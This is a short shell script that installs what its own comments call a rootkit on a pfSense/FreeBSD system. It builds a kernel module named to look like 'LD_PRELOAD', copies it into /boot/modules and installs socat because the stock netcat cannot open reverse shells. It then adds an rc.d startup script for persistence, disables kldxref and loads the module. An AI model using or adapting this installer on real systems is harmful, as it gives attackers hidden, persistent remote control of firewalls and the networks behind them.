#!/bin/sh

if [ "$(id -u)" -ne 0 ]; then
   echo "Must be root to run this"
   exit 1
fi

# make writable
mount -o rw /

make

# mv LD_PRELOAD.ko LD_PRELOAD
LKM_NAME="LD_PRELOAD.ko"

# put the rootkit in the modules
cp "$LKM_NAME" /boot/modules/
# the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
# therefore we get socat
pkg install -y socat

# service ldpreload start
mv ldpreload.sh /usr/local/etc/rc.d/
chmod +x /usr/local/etc/rc.d/ldpreload.sh

# Disable kldxref by setting kldxref_enable="NO"
sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf

kldload "/boot/modules/$LKM_NAME"
